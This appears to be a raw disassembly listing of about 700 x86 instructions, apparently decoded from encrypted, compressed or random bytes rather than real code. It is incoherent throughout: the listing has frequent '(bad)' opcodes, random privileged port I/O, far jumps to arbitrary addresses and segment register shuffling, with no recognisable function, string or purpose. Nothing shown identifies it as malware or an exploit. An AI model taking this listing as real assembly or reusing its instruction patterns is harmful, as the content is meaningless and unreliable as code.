  41b3b6:	adc    DWORD PTR [ebp-0x4ef29848],ecx
  41b3bc:	dec    eax
  41b3bd:	sbb    edi,DWORD PTR [edx-0x7a41a55d]
  41b3c3:	push   ebp
  41b3c4:	pop    ss
  41b3c5:	pop    ebp
  41b3c6:	lods   eax,DWORD PTR ds:[esi]
  41b3c7:	pop    es
  41b3c8:	mov    ch,cl
  41b3ca:	rcl    DWORD PTR [ecx],cl
  41b3cc:	or     ebx,DWORD PTR [eax]
  41b3ce:	mov    ds:0xd5a268e2,al
  41b3d3:	sar    BYTE PTR [ebx-0xb],1
  41b3d6:	jne    0x41b401
  41b3d8:	test   DWORD PTR ss:[eax],esp
  41b3db:	or     ch,bl
  41b3dd:	sar    edi,0x19
  41b3e0:	inc    esp
  41b3e1:	(bad)  
  41b3e2:	pusha  
  41b3e3:	mov    edi,0xc9a70070
  41b3e8:	mov    al,0xdb
  41b3ea:	sub    bh,dl
  41b3ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3ed:	rol    DWORD PTR [esi+0x5f],0x37
  41b3f1:	mov    WORD PTR [edi],gs
  41b3f3:	add    ecx,DWORD PTR [eax+0xbbc2ecd]
  41b3f9:	out    dx,eax
  41b3fa:	les    eax,FWORD PTR [esi+0x4]
  41b3fd:	add    ch,ah
  41b3ff:	ror    BYTE PTR [eax-0x21],0xbb
  41b403:	out    0xbc,eax
  41b405:	jne    0x41b426
  41b407:	mov    bh,0xc7
  41b409:	pop    ds
  41b40a:	pop    edi
  41b40b:	and    al,0x52
  41b40d:	rol    DWORD PTR [ebx],cl
  41b40f:	aam    0x46
  41b411:	and    BYTE PTR [edi+0x2b8f5497],ch
  41b417:	or     DWORD PTR [eax+0x17aae8cf],0xffffff80
  41b41e:	out    dx,al
  41b41f:	mul    DWORD PTR [edi]
  41b421:	add    esp,DWORD PTR [esi+0x440ab7b5]
  41b427:	jge    0x41b43c
  41b429:	push   eax
  41b42a:	ins    BYTE PTR es:[edi],dx
  41b42b:	pop    ecx
  41b42c:	cwde   
  41b42d:	leave  
  41b42e:	or     ch,ah
  41b430:	push   0x100dc9e7
  41b435:	add    BYTE PTR [eax+0x4d],dh
  41b438:	sub    edi,DWORD PTR [ebp-0x7a703d89]
  41b43e:	daa    
  41b43f:	pop    edi
  41b440:	xchg   ebx,eax
  41b441:	sub    DWORD PTR [ebx+ebx*1+0x76],esp
  41b445:	test   BYTE PTR [edx+0x60],bh
  41b448:	test   al,0x35
  41b44a:	mov    esp,DWORD PTR [ebx-0x5ab7bb8e]
  41b450:	pop    ebx
  41b451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b452:	sbb    al,0xd3
  41b454:	mov    ds,esi
  41b456:	sub    ch,BYTE PTR [esi-0x62a6f4c8]
  41b45c:	mov    edi,edi
  41b45e:	daa    
  41b45f:	push   esi
  41b460:	or     esp,DWORD PTR ss:[ebp+eiz*2-0x44d2f3ee]
  41b468:	xchg   edx,eax
  41b469:	cmp    esp,DWORD PTR [eax+0x6e]
  41b46c:	or     bh,dl
  41b46e:	shl    bh,0xb8
  41b471:	jp     0x41b4c9
  41b473:	pop    ebp
  41b474:	and    eax,0x863d1e15
  41b479:	fsub   DWORD PTR [ebp+0x6b]
  41b47c:	jmp    0x41b480
  41b47e:	rcl    BYTE PTR [ebp+0x4af1972f],0xe0
  41b485:	mov    ds,WORD PTR [edi]
  41b487:	jg     0x41b478
  41b489:	aaa    
  41b48a:	fsubr  DWORD PTR [esi+0x34]
  41b48d:	add    BYTE PTR [edx+edi*4-0x3f013512],cl
  41b494:	mov    BYTE PTR [eax-0xb357381],dh
  41b49a:	jge    0x41b4ad
  41b49c:	xchg   esi,eax
  41b49d:	outs   dx,DWORD PTR ds:[esi]
  41b49e:	out    0x14,al
  41b4a0:	icebp  
  41b4a1:	xchg   edi,eax
  41b4a2:	out    0x1b,eax
  41b4a4:	xlat   BYTE PTR ds:[ebx]
  41b4a5:	pop    ss
  41b4a6:	mov    ds:0x5bc68db7,al
  41b4ab:	adc    al,0x2c
  41b4ad:	sub    ebx,DWORD PTR [esp+esi*1]
  41b4b0:	push   ecx
  41b4b1:	daa    
  41b4b2:	pop    ebp
  41b4b4:	loop   0x41b4dc
  41b4b6:	test   eax,0x9202e0df
  41b4bb:	jae    0x41b463
  41b4bd:	inc    ebp
  41b4be:	cld    
  41b4bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4c0:	test   esi,esi
  41b4c2:	lea    ecx,gs:[edi+0x59df0b93]
  41b4c9:	test   edi,esi
  41b4cb:	mov    edx,0xd91ff148
  41b4d0:	xchg   DWORD PTR [ecx],eax
  41b4d2:	and    BYTE PTR [ecx],dl
  41b4d4:	mov    esp,0x39d4d1fd
  41b4d9:	iret   
  41b4da:	xchg   esp,eax
  41b4db:	sbb    al,0xe7
  41b4dd:	fwait
  41b4de:	inc    ebp
  41b4df:	mov    cl,0x89
  41b4e1:	imul   esp,DWORD PTR [edi-0x5b4b8077],0xbc1eeb19
  41b4eb:	aas    
  41b4ec:	mov    cl,0x24
  41b4ee:	repnz dec ebp
  41b4f0:	es sbb dl,0x3c
  41b4f4:	inc    DWORD PTR ds:0xd0766240
  41b4fa:	xor    DWORD PTR [ebp+0x3b],eax
  41b4fd:	pop    ss
  41b4fe:	or     al,0x96
  41b500:	mov    bl,0x29
  41b502:	jg     0x41b499
  41b504:	or     BYTE PTR [ebp-0x1443e411],dh
  41b50a:	test   ch,dl
  41b50c:	mov    edx,DWORD PTR [edi+0x5e]
  41b50f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b510:	cmp    BYTE PTR [ecx-0x65],0xea
  41b514:	mov    DWORD PTR [ebp+0x5a],ecx
  41b517:	in     eax,0x4b
  41b519:	pop    edi
  41b51a:	daa    
  41b51b:	pop    ebx
  41b51c:	mov    eax,ds:0x5b232a02
  41b521:	jnp    0x41b4ef
  41b523:	xor    al,0x65
  41b525:	xchg   ebx,eax
  41b526:	pop    esi
  41b527:	dec    ebx
  41b528:	dec    esi
  41b529:	sbb    BYTE PTR [esi],bl
  41b52b:	cmp    ah,0x5d
  41b52e:	imul   esi,DWORD PTR [edi+edi*8+0x3c016c02],0x7f
  41b536:	mov    ecx,0x1e683332
  41b53b:	jae    0x41b548
  41b53d:	sub    bh,bl
  41b53f:	add    DWORD PTR [esi+0x408f11a6],0x8f64feb9
  41b549:	inc    ebx
  41b54a:	int    0x90
  41b54c:	xor    esp,DWORD PTR [edx-0x42]
  41b54f:	push   edx
  41b550:	cdq    
  41b551:	xor    DWORD PTR [edi],ebx
  41b553:	scas   eax,DWORD PTR es:[edi]
  41b554:	pop    ebx
  41b555:	sub    esi,DWORD PTR fs:[esi]
  41b558:	cwde   
  41b559:	sub    BYTE PTR [esp+edx*8+0x482927bd],dh
  41b560:	xor    al,0xce
  41b562:	int    0x19
  41b564:	mov    DWORD PTR ds:0x8560fa44,ebx
  41b56a:	(bad)
  41b56e:	mov    esi,0xb49cd2fd
  41b573:	test   BYTE PTR ds:0xddbd60b6,cl
  41b579:	dec    DWORD PTR [ebx-0x66]
  41b57c:	push   0x3f
  41b57e:	cmp    al,0xaf
  41b580:	adc    edx,eax
  41b582:	jmp    0xfc0f:0x25025391
  41b589:	les    ebp,FWORD PTR [esi+0xd]
  41b58c:	fcomp  QWORD PTR [eax]
  41b58e:	mov    edi,0xaced4df3
  41b593:	push   ebp
  41b594:	mov    dh,0x99
  41b596:	mov    esp,0xf6956cd5
  41b59b:	jl     0x41b531
  41b59d:	inc    eax
  41b59e:	arpl   WORD PTR [ebp+0x60],si
  41b5a1:	jae    0x41b61d
  41b5a3:	out    0xcf,eax
  41b5a5:	call   0xc3de:0x96a145b
  41b5ac:	mov    al,BYTE PTR [eax]
  41b5ae:	jle    0x41b5be
  41b5b0:	or     al,0x3e
  41b5b2:	xchg   edx,eax
  41b5b3:	dec    cx
  41b5b5:	or     ebx,DWORD PTR [esi]
  41b5b7:	mov    ecx,DWORD PTR [ecx-0x4b73673d]
  41b5bd:	xor    DWORD PTR [ecx],0x10
  41b5c0:	test   al,0xfa
  41b5c2:	xchg   esi,eax
  41b5c3:	aam    0x96
  41b5c5:	fdiv   QWORD PTR [ebp+0x40]
  41b5c8:	fstp   DWORD PTR [esi]
  41b5ca:	mov    BYTE PTR [edx],al
  41b5cc:	xchg   BYTE PTR [ebx],ah
  41b5ce:	ins    BYTE PTR es:[edi],dx
  41b5cf:	inc    ebp
  41b5d0:	mov    al,BYTE PTR [ebx+0x3249c26e]
  41b5d6:	jbe    0x41b630
  41b5d8:	jl     0x41b5dc
  41b5da:	pop    edx
  41b5db:	clc    
  41b5dc:	pop    eax
  41b5dd:	scas   eax,DWORD PTR es:[edi]
  41b5de:	xchg   esp,eax
  41b5df:	fwait
  41b5e0:	push   ecx
  41b5e1:	shr    BYTE PTR [ebp+0x53],1
  41b5e4:	in     eax,dx
  41b5e5:	ficom  WORD PTR [ebx-0x4a]
  41b5e8:	mov    DWORD PTR [eax],esi
  41b5ea:	clc    
  41b5eb:	sbb    BYTE PTR [eax],ah
  41b5ed:	jae    0x41b66e
  41b5ef:	aad    0xd8
  41b5f1:	in     eax,0x49
  41b5f3:	fnstcw WORD PTR [ecx+0x34]
  41b5f6:	xor    DWORD PTR [edi+eiz*4+0x2f],ebx
  41b5fa:	sub    bl,BYTE PTR [edx-0x2f600078]
  41b600:	clc    
  41b601:	pop    edi
  41b602:	push   edx
  41b603:	aad    0x1e
  41b605:	jo     0x41b636
  41b607:	leave  
  41b608:	vpaddsw xmm0,xmm5,XMMWORD PTR [edi]
  41b60c:	mov    DWORD PTR [edi],ebp
  41b60e:	cmp    eax,esp
  41b610:	test   al,0x7f
  41b612:	sti    
  41b613:	jmp    0x41b67b
  41b615:	repnz mov al,ds:0x4637cb14
  41b61b:	call   0xd0a3d2ef
  41b620:	pop    esp
  41b621:	adc    DWORD PTR [edi-0x34],edi
  41b624:	pop    edi
  41b625:	mov    cl,0x1f
  41b627:	(bad)  
  41b628:	or     al,0xac
  41b62a:	retf   0x5b3
  41b62d:	push   ebx
  41b62e:	rol    DWORD PTR [edx-0x20],1
  41b631:	and    BYTE PTR [eax-0x41],0xf9
  41b635:	lods   eax,DWORD PTR ds:[esi]
  41b636:	dec    esp
  41b637:	adc    al,0x19
  41b639:	es push ds
  41b63b:	mov    cl,0x9a
  41b63d:	test   eax,0x6e7f3a9d
  41b643:	lahf   
  41b644:	fcmovnbe st,st(6)
  41b646:	pop    edi
  41b647:	push   ebx
  41b648:	je     0x41b69c
  41b64a:	dec    esi
  41b64b:	call   0x253962f8
  41b650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b651:	(bad)  
  41b652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b653:	mov    ebp,0xb41abd8e
  41b658:	mov    edx,0x929ac685
  41b65d:	dec    edx
  41b65e:	mov    es:0x781a01ed,al
  41b664:	out    dx,eax
  41b665:	int    0x9f
  41b667:	fidivr DWORD PTR [edx-0xa]
  41b66a:	xlat   BYTE PTR ds:[ebx]
  41b66b:	mov    edi,0x14e205ac
  41b670:	popf   
  41b671:	jno    0x41b67a
  41b673:	ja     0x41b600
  41b675:	add    al,BYTE PTR [eax]
  41b677:	(bad)  [edx+eiz*8]
  41b67a:	mov    eax,ds:0x1fd623e1
  41b67f:	adc    DWORD PTR ds:0x3e6654c3,ebx
  41b685:	mov    ds:0xc710d5d2,eax
  41b68a:	mov    ah,0x7d
  41b68c:	mov    ?,esp
  41b68e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b68f:	sub    ecx,DWORD PTR [ecx-0x40d1fed5]
  41b695:	arpl   cx,dx
  41b697:	mov    al,ss:0x50c44202
  41b69d:	fs xchg ebp,eax
  41b69f:	test   eax,0x9f1e50fe
  41b6a4:	lock lods al,BYTE PTR ds:[esi]
  41b6a6:	test   al,0xb3
  41b6a8:	inc    edx
  41b6a9:	ins    DWORD PTR es:[edi],dx
  41b6aa:	and    edx,esp
  41b6ac:	ins    DWORD PTR es:[edi],dx
  41b6ad:	jbe    0x41b6b2
  41b6af:	stc    
  41b6b0:	ja     0x41b6f7
  41b6b2:	push   ebp
  41b6b3:	into   
  41b6b4:	mov    bh,ah
  41b6b6:	fwait
  41b6b7:	lods   eax,DWORD PTR ds:[esi]
  41b6b8:	xor    bh,dh
  41b6ba:	jmp    0x41b6c0
  41b6bc:	adc    al,BYTE PTR [edi-0x36]
  41b6bf:	dec    esp
  41b6c0:	mov    cl,0x82
  41b6c2:	bound  esi,QWORD PTR [eax+0x5329b675]
  41b6c8:	(bad)  
  41b6c9:	sub    eax,0x438cf79e
  41b6ce:	mov    esi,0xac86e05
  41b6d3:	aam    0x81
  41b6d5:	sbb    BYTE PTR [esi-0x48],bh
  41b6d8:	and    DWORD PTR [edi],esp
  41b6da:	adc    ch,ch
  41b6dc:	mov    DWORD PTR [edi],ebx
  41b6de:	or     eax,0x4a680a87
  41b6e3:	mov    cl,0x7d
  41b6e5:	add    ch,BYTE PTR [esi-0x3e]
  41b6e8:	and    al,0xa1
  41b6ea:	mov    DWORD PTR [ecx],edi
  41b6ec:	loope  0x41b6cc
  41b6ee:	popa   
  41b6ef:	sti    
  41b6f0:	and    al,0xee
  41b6f2:	xor    BYTE PTR ss:[ebp+0x707e020d],dl
  41b6f9:	push   ecx
  41b6fa:	aas    
  41b6fb:	lods   al,BYTE PTR ds:[esi]
  41b6fc:	jg     0x41b6d1
  41b6fe:	push   0x8e859c31
  41b703:	cwde   
  41b704:	lahf   
  41b705:	mov    WORD PTR [eax-0x75],fs
  41b708:	pop    ds
  41b709:	(bad)  
  41b70b:	sub    al,0x26
  41b70d:	add    al,0x2c
  41b70f:	fwait
  41b710:	xchg   esi,eax
  41b711:	sub    ebx,edx
  41b713:	push   esi
  41b714:	mov    fs,WORD PTR [ebx]
  41b716:	cmp    BYTE PTR [ebx],bh
  41b718:	cmc    
  41b719:	cmc    
  41b71a:	out    dx,al
  41b71b:	lock call 0x5cdf07ea
  41b721:	add    al,0x28
  41b723:	xlat   BYTE PTR ds:[ebx]
  41b724:	jae    0x41b792
  41b726:	push   eax
  41b727:	sub    BYTE PTR [edx],bl
  41b729:	cwde   
  41b72a:	mov    bl,0x53
  41b72c:	push   esp
  41b72d:	mov    ds:0x798b1b60,eax
  41b732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b733:	inc    ecx
  41b734:	or     bh,BYTE PTR [ebp+0x43]
  41b737:	aam    0x49
  41b739:	mov    eax,0xf99dc5d9
  41b73e:	add    ecx,esp
  41b740:	imul   ebx,DWORD PTR [edx+0xc16d36e],0x5828fd77
  41b74a:	jmp    0x3243ba81
  41b74f:	mov    ds:0xbd24b07c,al
  41b754:	mov    ah,0x63
  41b756:	push   ds
  41b757:	or     eax,0xca399dcd
  41b75c:	xchg   edx,eax
  41b75d:	outs   dx,BYTE PTR ds:[esi]
  41b75e:	pop    esp
  41b75f:	aad    0x7e
  41b761:	out    dx,al
  41b762:	inc    eax
  41b763:	into   
  41b764:	stos   BYTE PTR es:[edi],al
  41b765:	cmp    al,0xf6
  41b767:	and    DWORD PTR [ecx-0x21fdd18d],eax
  41b76d:	adc    al,0x1f
  41b76f:	fimul  WORD PTR [eax]
  41b771:	fucomi st,st(3)
  41b773:	aad    0x9e
  41b775:	or     dl,BYTE PTR [edi+0x123c2b57]
  41b77b:	cmp    DWORD PTR [ecx+0x3590b87d],ecx
  41b781:	fs pop edx
  41b783:	jle    0x41b78e
  41b785:	adc    eax,0x8e675504
  41b78a:	mov    ah,0xb5
  41b78c:	xor    DWORD PTR [ebp+0x27881041],0xffffffd1
  41b793:	mov    bl,0xa8
  41b795:	imul   esp,esp,0x5c05ba82
  41b79b:	sahf   
  41b79c:	clc    
  41b79d:	xor    BYTE PTR [ecx-0x7],0xad
  41b7a1:	dec    esi
  41b7a2:	fwait
  41b7a3:	sub    eax,eax
  41b7a5:	xchg   BYTE PTR [ecx],ah
  41b7a7:	inc    edi
  41b7a8:	lock add ch,BYTE PTR [ebx-0x4f114b40]
  41b7af:	fcom   DWORD PTR [ebx]
  41b7b1:	add    cl,BYTE PTR [edi+edx*8+0x24c6a2d7]
  41b7b8:	pop    esi
  41b7b9:	rcr    BYTE PTR [edi],1
  41b7bb:	sbb    esp,DWORD PTR [ebp+0x55]
  41b7be:	jb     0x41b775
  41b7c0:	ret    0x2574
  41b7c3:	xlat   BYTE PTR ds:[ebx]
  41b7c4:	cdq    
  41b7c5:	ret    
  41b7c6:	arpl   WORD PTR [edx+0x70ce68ad],ax
  41b7cc:	mov    BYTE PTR [ebp-0x49],bh
  41b7cf:	push   eax
  41b7d0:	mov    bh,0x38
  41b7d2:	cmp    dh,bh
  41b7d4:	inc    eax
  41b7d5:	daa    
  41b7d6:	mov    WORD PTR [ecx-0x3c],?
  41b7d9:	cmc    
  41b7da:	lahf   
  41b7db:	cld    
  41b7dc:	push   cs
  41b7dd:	pusha  
  41b7de:	lahf   
  41b7df:	or     DWORD PTR [ecx-0x65],0x4
  41b7e3:	jnp    0x41b76c
  41b7e5:	(bad)  [edi-0x1b88c831]
  41b7eb:	shl    BYTE PTR [ebx],0xf3
  41b7ee:	not    BYTE PTR [edi-0x3dffa45]
  41b7f4:	test   al,0xb3
  41b7f6:	mov    esp,0x761a8f2c
  41b7fb:	and    eax,0xc05331b9
  41b801:	add    al,dl
  41b803:	jecxz  0x41b7ff
  41b805:	pop    ecx
  41b806:	cdq    
  41b807:	test   al,0x3d
  41b809:	sbb    DWORD PTR [esi],ebx
  41b80b:	out    0x21,eax
  41b80d:	(bad)  
  41b80e:	(bad)  
  41b80f:	pop    esp
  41b810:	mov    al,0x1c
  41b812:	push   es
  41b813:	sahf   
  41b814:	lods   al,BYTE PTR ds:[esi]
  41b815:	imul   esi,DWORD PTR [esi+0x54],0x36
  41b819:	loope  0x41b871
  41b81b:	mov    eax,ds:0xb91f907c
  41b820:	retf   
  41b821:	mov    ecx,0x2120ee49
  41b826:	adc    eax,0xd1804b5
  41b82b:	std    
  41b82c:	leave  
  41b82d:	xor    DWORD PTR [ebx+0x293daf3],ebp
  41b833:	mov    dl,0x89
  41b835:	popa   
  41b836:	xor    DWORD PTR [ebp+0x6368ad7b],0x91e80260
  41b840:	cmp    al,0xaa
  41b842:	test   eax,0x1f8e5037
  41b847:	pop    es
  41b848:	mov    ah,0xe7
  41b84a:	mov    eax,gs:0x35f11ac1
  41b850:	and    al,0x1
  41b852:	mov    eax,ds:0x13f138d4
  41b857:	in     al,0xfe
  41b859:	mov    cl,0x90
  41b85b:	fwait
  41b85c:	jb     0x41b802
  41b85e:	pusha  
  41b85f:	test   esp,0x95aa2a34
  41b865:	xchg   edx,eax
  41b866:	call   0x1eba75c8
  41b86b:	test   eax,0x5cab44d0
  41b870:	mov    al,0x2f
  41b872:	push   ds
  41b873:	fwait
  41b874:	inc    edx
  41b875:	(bad)  
  41b876:	fwait
  41b877:	pop    ebx
  41b878:	cmp    al,0xd1
  41b87a:	sbb    esi,edx
  41b87c:	mov    BYTE PTR [edx],ch
  41b87e:	dec    esp
  41b87f:	fcomp  QWORD PTR [eax-0x6f]
  41b882:	outs   dx,DWORD PTR ds:[esi]
  41b883:	fstp   QWORD PTR [eax+0x4c]
  41b886:	pop    ecx
  41b887:	push   ecx
  41b888:	jg     0x41b850
  41b88a:	pusha  
  41b88b:	std    
  41b88c:	scas   al,BYTE PTR es:[edi]
  41b88d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b88e:	pusha  
  41b88f:	push   0x5f3626ac
  41b894:	cmp    eax,DWORD PTR [ebp-0x22]
  41b897:	jno    0x41b8e0
  41b899:	fldcw  WORD PTR [ebp-0x1a]
  41b89c:	mov    ah,BYTE PTR [ecx]
  41b89e:	mov    ds:0xa434be1e,al
  41b8a3:	mov    ebp,0xb51735e8
  41b8a8:	xchg   esp,eax
  41b8a9:	lock iret 
  41b8ab:	sbb    eax,0x638282f1
  41b8b0:	int3   
  41b8b1:	daa    
  41b8b2:	cld    
  41b8b3:	popf   
  41b8b4:	xchg   esi,eax
  41b8b5:	leave  
  41b8b6:	pop    ds
  41b8b7:	je     0x41b87c
  41b8b9:	and    al,0x3e
  41b8bb:	aam    0x93
  41b8bd:	add    DWORD PTR [edi-0x63],esi
  41b8c0:	jb     0x41b8de
  41b8c2:	stos   BYTE PTR es:[edi],al
  41b8c3:	mov    eax,0x241c85f1
  41b8c8:	push   0x74d9a5eb
  41b8cd:	frstor [ebp+0x2f]
  41b8d0:	jge    0x41b891
  41b8d2:	mov    dh,0x29
  41b8d4:	rcl    ch,0x98
  41b8d7:	ret    0x5d4
  41b8da:	mov    al,0xf8
  41b8dc:	dec    ebp
  41b8dd:	fnstcw WORD PTR [edx]
  41b8df:	or     esi,DWORD PTR [ebp+0x3b]
  41b8e2:	ins    DWORD PTR es:[edi],dx
  41b8e3:	gs into 
  41b8e5:	xchg   edx,eax
  41b8e6:	pushf  
  41b8e7:	mov    ds:0x7d3328c9,al
  41b8ec:	add    DWORD PTR [ebx+edx*4+0x896891d],ecx
  41b8f3:	sub    edx,esp
  41b8f5:	inc    sp
  41b8f7:	adc    ecx,DWORD PTR [eax+0x2cdba3f9]
  41b8fd:	adc    al,0xce
  41b8ff:	cmp    BYTE PTR [ebx+0xf92e256],dh
  41b905:	add    ah,bh
  41b907:	and    eax,0x9637fcea
  41b90c:	jp     0x41b8c1
  41b90e:	push   0xaf859aa7
  41b913:	ins    BYTE PTR es:[edi],dx
  41b914:	xchg   BYTE PTR [edx],al
  41b916:	mov    edi,0xf3c146f6
  41b91b:	mov    ecx,0x48ab0e57
  41b920:	add    dl,BYTE PTR ss:[ebx+0x514efe1b]
  41b927:	stos   DWORD PTR es:[edi],eax
  41b928:	mov    BYTE PTR [ebp-0xe8b4883],al
  41b92e:	fstp   TBYTE PTR [eax+0x2c4602a6]
  41b934:	lock inc esi
  41b936:	jo     0x41b8c6
  41b938:	pop    ebx
  41b939:	pusha  
  41b93a:	jge    0x41b949
  41b93c:	aaa    
  41b93d:	push   ecx
  41b93e:	hlt    
  41b93f:	adc    eax,0xcdae140
  41b944:	pop    esi
  41b945:	add    bh,ah
  41b947:	inc    ebx
  41b948:	xchg   ebp,eax
  41b949:	xor    BYTE PTR [di+0x11],bl
  41b94d:	xor    bl,BYTE PTR [esi]
  41b94f:	lahf   
  41b950:	xor    DWORD PTR [eax-0x33ed76b6],ebp
  41b956:	sbb    dl,ah
  41b958:	or     eax,0x9a606b6d
  41b95d:	sbb    ebx,DWORD PTR [ecx-0x122a7395]
  41b963:	sbb    ebp,DWORD PTR [eax-0x72]
  41b966:	fst    DWORD PTR [eax+ebp*4+0x23]
  41b96a:	sub    dl,bh
  41b96c:	es je  0x41b935
  41b96f:	scas   al,BYTE PTR es:[edi]
  41b970:	(bad)
  41b973:	in     eax,dx
  41b974:	js     0x41b97a
  41b976:	pop    ds
  41b977:	arpl   sp,bx
  41b979:	sti    
  41b97a:	xchg   DWORD PTR [ebx],eax
  41b97c:	mov    ds:0xb1d2b1e3,al
  41b981:	out    dx,al
  41b982:	push   ds
  41b983:	fwait
  41b984:	xchg   ebx,eax
  41b985:	mov    edi,0x5d52aac7
  41b98a:	scas   eax,DWORD PTR es:[edi]
  41b98b:	push   esp
  41b98c:	or     ch,BYTE PTR [edi-0x3cbad95d]
  41b992:	mov    bh,0x23
  41b994:	mov    BYTE PTR [ebx],bl
  41b996:	jmp    0x7e896eb5
  41b99b:	or     DWORD PTR [esi],esp
  41b99d:	add    eax,DWORD PTR [eax+0x22]
  41b9a0:	xchg   ebx,eax
  41b9a1:	stos   BYTE PTR es:[edi],al
  41b9a2:	push   ebx
  41b9a3:	adc    DWORD PTR [ecx],edi
  41b9a5:	in     al,dx
  41b9a6:	pop    ds
  41b9a7:	imul   DWORD PTR [edi+eiz*1-0x61]
  41b9ab:	dec    ebx
  41b9ac:	ins    BYTE PTR es:[edi],dx
  41b9ad:	outs   dx,BYTE PTR ds:[esi]
  41b9ae:	push   cs
  41b9af:	mov    ebp,0xed787bcf
  41b9b4:	popa   
  41b9b5:	pop    esp
  41b9b6:	pop    ds
  41b9b7:	in     eax,0x74
  41b9b9:	dec    esi
  41b9ba:	sub    BYTE PTR [esi-0x5b],al
  41b9bd:	add    eax,DWORD PTR [eax-0x66]
  41b9c0:	push   ss
  41b9c1:	mov    dl,0xca
  41b9c3:	gs out 0xd,al
  41b9c6:	out    0xc4,al
  41b9c8:	enter  0x229a,0x5e
  41b9cc:	xchg   esp,eax
  41b9cd:	xchg   DWORD PTR ds:0x54c3ab4b,esp
  41b9d3:	lds    ecx,FWORD PTR [edi]
  41b9d5:	cmp    al,BYTE PTR [eax+0x4029502d]
  41b9db:	aam    0xb8
  41b9dd:	xchg   edi,eax
  41b9de:	fisubr WORD PTR [ebx+0x71]
  41b9e1:	fistp  WORD PTR [esi]
  41b9e3:	xor    cl,BYTE PTR [eax-0x15c8d027]
  41b9e9:	xor    BYTE PTR [ebx],ah
  41b9eb:	ds sahf 
  41b9ed:	dec    ecx
  41b9ee:	fiadd  DWORD PTR [ebx-0x20c86acd]
  41b9f4:	aas    
  41b9f5:	sub    ah,0xa4
  41b9f8:	data16 out 0x99,al
  41b9fb:	jmp    FWORD PTR [ebp+0x1d]
  41b9fe:	enter  0x254b,0x1b
  41ba02:	push   cs
  41ba03:	xchg   edi,eax
  41ba04:	mov    esi,0x67d54d73
  41ba09:	jmp    FWORD PTR [edi-0x38]
  41ba0c:	in     al,dx
  41ba0d:	fs jmp 0x5dd54385
  41ba13:	xchg   ebp,eax
  41ba14:	jl     0x41ba93
  41ba16:	lods   al,BYTE PTR ds:[esi]
  41ba17:	js     0x41b9c0
  41ba19:	add    ah,BYTE PTR [esi+0x3d89e980]
  41ba1f:	pop    es
  41ba20:	pop    esp
  41ba21:	dec    ebp
  41ba22:	push   ds
  41ba23:	jmp    0x41ba8b
  41ba25:	retf   
  41ba26:	and    DWORD PTR [ebx-0x3a],0xffd54bd8
  41ba2d:	pushf  
  41ba2e:	aaa    
  41ba2f:	gs add al,0xf7
  41ba32:	mov    bh,0x6e
  41ba34:	mov    ah,0xd9
  41ba36:	std    
  41ba37:	inc    esi
  41ba38:	or     ch,dh
  41ba3a:	not    BYTE PTR [eax-0x369c5bf9]
  41ba40:	adc    eax,0x5e132802
  41ba45:	cwde   
  41ba46:	outs   dx,DWORD PTR ds:[esi]
  41ba47:	mov    WORD PTR [eax+0x37e11f7f],?
  41ba4d:	pop    DWORD PTR [ecx]
  41ba4f:	enter  0x9bfe,0x60
  41ba53:	aam    0x6e
  41ba55:	push   edi
  41ba56:	imul   edi,DWORD PTR [eax-0x61],0x8815a555
  41ba5d:	imul   esi,DWORD PTR [esi-0x3d],0x9b0b5e37
  41ba64:	daa    
  41ba65:	test   DWORD PTR [edi],edi
  41ba67:	pop    es
  41ba68:	les    edi,FWORD PTR [eax+0x64]
  41ba6b:	aad    0xa3
  41ba6d:	push   ecx
  41ba6e:	sbb    DWORD PTR [eax+0x1c],eax
  41ba71:	dec    ecx
  41ba72:	add    DWORD PTR [edx-0x77],esi
  41ba75:	gs jbe 0x41bacf
  41ba78:	and    eax,0x61f6904f
  41ba7d:	daa    
  41ba7e:	stos   BYTE PTR es:[edi],al
  41ba7f:	fcomp  QWORD PTR [ecx-0x3f]
  41ba82:	loopne 0x41bb01
  41ba84:	and    eax,0xd425da90
  41ba89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba8a:	sub    esp,esp
  41ba8c:	mov    bl,0xd3
  41ba8e:	mov    al,0xbd
  41ba90:	ins    BYTE PTR es:[edi],dx
  41ba91:	dec    ecx
  41ba92:	push   ds
  41ba93:	inc    ecx
  41ba94:	out    0x9f,al
  41ba96:	scas   eax,DWORD PTR es:[edi]
  41ba97:	or     DWORD PTR [edx-0x3a],eax
  41ba9a:	and    BYTE PTR [edx-0x4af87439],ah
  41baa0:	mov    BYTE PTR [edx+edx*2+0x2],ch
  41baa4:	sub    DWORD PTR [eax+0x22c2f760],esi
  41baaa:	adc    WORD PTR [esi+eax*4-0x4e],0x9bb9
  41bab1:	arpl   sp,cx
  41bab3:	repz dec ecx
  41bab5:	or     ecx,edi
  41bab7:	mov    edx,0xf59b1d85
  41babc:	cmp    eax,DWORD PTR [edx]
  41babe:	dec    ebx
  41babf:	xchg   ebx,eax
  41bac0:	dec    eax
  41bac1:	sbb    esi,DWORD PTR [edx+0x8032c94]
  41bac7:	dec    eax
  41bac8:	lods   eax,DWORD PTR ds:[esi]
  41bac9:	cmp    ch,BYTE PTR [edx+ebx*2-0x5d]
  41bacd:	(bad)  
  41bace:	pusha  
  41bacf:	aad    0xfc
  41bad1:	jmp    0x3c36:0x15afebc6
  41bad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bad9:	pop    es
  41bada:	popa   
  41badb:	cmp    DWORD PTR [esi],esp
  41badd:	ret    
  41bade:	add    eax,0xa0bb63ad
  41bae3:	ror    DWORD PTR [eax-0x6ebf817b],0x67
  41baea:	jle    0x41bac7
  41baec:	mov    BYTE PTR [edi+0x34],0x19
  41baf0:	push   edi
  41baf1:	adc    BYTE PTR [edx],0x2b
  41baf4:	or     ah,al
  41baf6:	jecxz  0x41bb74
  41baf8:	mov    DWORD PTR ds:0x71a66561,edx
  41bafe:	(bad)  
  41baff:	pop    ebx
  41bb00:	sbb    eax,0x898c4f8c
  41bb05:	adc    ebx,ebx
  41bb07:	rcl    ebx,0xb4
  41bb0a:	retf   0x895d
  41bb0d:	in     eax,0x8
